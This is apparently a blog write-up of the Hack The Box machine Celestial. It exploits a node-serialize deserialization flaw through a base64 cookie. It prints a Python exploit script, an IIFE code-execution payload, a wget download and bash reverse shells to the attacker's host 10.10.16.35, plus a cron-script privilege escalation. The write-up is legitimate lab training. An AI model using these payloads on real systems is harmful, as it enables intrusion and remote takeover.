---
title: Celestial (Hack The Box Writeup)
date: 2021-09-23T13:51:00+08:00
draft: false
url: "/2021/09/23/celestial-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

- URL : https://app.hackthebox.eu/machines/130
- IP : 10.129.217.35

## Recon

- 掃 Port`nmapAutomator.sh -H 10.129.217.35 -t recon`
- ![](/uploads/2022/02/41fa0-vZmyavd.png)掃路徑- ![](/uploads/2022/02/5a918-hna0l1B.png)首頁 404- ![](/uploads/2022/02/d4c7a-wAlHdP2.png)發現有餅乾- ![](/uploads/2022/02/f2c3f-ocmsv5M.png)F5 後- ![](/uploads/2022/02/543c2-ELQeEWv.png)
- 發現餅乾是 Serialize

## Serialize

```python
import requests
import base64

src = b'{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}'
dst = base64.b64encode(src).decode('ascii')
cookies = {
    'profile': dst
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'If-None-Match': 'W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"',
    'Cache-Control': 'max-age=0',
}

response = requests.get('http://10.129.217.35:3000/', headers=headers, cookies=cookies)

print(response.text)
```

亂戳

```
{"username": "meow" ,"country":"Idk Probably Somewhere Dumb","city":"Lametown","num": true}
```

會回傳

```
Hey meow true + true is 2
```

戳

```
{"username": "meow" ,"country":"Idk Probably Somewhere Dumb","city":"Lametown","num": []}
```

會回傳

```
Hey meow  +  is undefined
```

戳

```
eval("A")
```

會噴錯  
錯誤中有提到

```
SyntaxError: Unexpected token e
    at Object.parse (native)
    at Object.exports.unserialize (/home/sun/node_modules/node-serialize/lib/serialize.js
```

- Google `node-serialize exploit`
- https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf

透過 IIFE 來達成 RCE

```javascript
var y = {
    rce : function(){
    require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
    },
   }

var serialize = require('node-serialize'); 
console.log("Serialized: \n" + serialize.serialize(y));
```

```
{"rce":"_$$ND_FUNC$$_function(){\n    require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n    }"}
```

```javascript
var y = {
    rce : function(){
    require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}(),
    username: "meow" ,
    country:"Idk Probably Somewhere Dumb",
    city :"Lametown",
    // num: 2,
   }

var serialize = require('node-serialize'); 
// console.log("Serialized: \n" + Buffer.from(serialize.serialize(y)).toString('base64'));

var s = serialize.serialize(y);

// console.log(s)

serialize.unserialize(s)
```

- 戳 Reverse shell`bash -c 'bash -i >& /dev/tcp/10.10.16.35/7877 0>&1'`

## Exploit

- 完整 Payload`src = """{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2","rce":"_$$ND_FUNC$$_function (){require('child_process').exec('wget 10.10.16.35', function(error, stdout, stderr) { console.log(stdout) });}()"}"""`

```python
import requests
import base64

cmd = "wget 10.10.16.35"
src = """{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2","rce":"_$$ND_FUNC$$_function (){require('child_process').exec('""" + cmd + """', function(error, stdout, stderr) { console.log(stdout) });}()"}"""
src = src.encode('ascii')

dst = base64.b64encode(src).decode('ascii')

cookies = {
    'profile': dst
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'If-None-Match': 'W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"',
    'Cache-Control': 'max-age=0',
}

response = requests.get('http://10.129.217.35:3000/', headers=headers, cookies=cookies)

print(response.text)
```

- 就成功 RCE ㄌ`wget 10.10.16.35/s_HTB -O /tmp/s`
- 放 Reverse shell戳回來- ![](/uploads/2022/02/59fa9-KNdkFxD.png)

## 提權

- `python -c 'import pty; pty.spawn("/bin/bash")'`
- 發現家目錄有 `output.txt`![](/uploads/2022/02/5ec7b-uvKZeeo.png)跑豌豆- ![](/uploads/2022/02/9ea4f-VrJv2p6.png)
- ![](/uploads/2022/02/cd396-kG7e4jh.png)找到一個 Cronjob觀察 `output.txt`- ![](/uploads/2022/02/698a8-vDyw6w4.png)尋找 `Script is running 在哪`- `grep -rnw '/' -e 'Script is running...' 2>/dev/null`
- ![](/uploads/2022/02/a3f9e-ZVbg62o.png)找到 user flag- ![](/uploads/2022/02/4786c-R8u4ah3.png)script 是 cron job 每5分鐘跑一次，且我們可以修改- ![](/uploads/2022/02/57228-14Mt18a.png)戳 reverse shell- `echo "import os" > script.py`
- `echo "os.system(\"bash -c 'bash -i >& /dev/tcp/10.10.16.35/7878 0>&1'\")" >> script.py`收 Reverse shell- ![](/uploads/2022/02/92fb3-QhPAE7i.png)
- ![](/uploads/2022/02/7b94c-FA4Cldq.png)
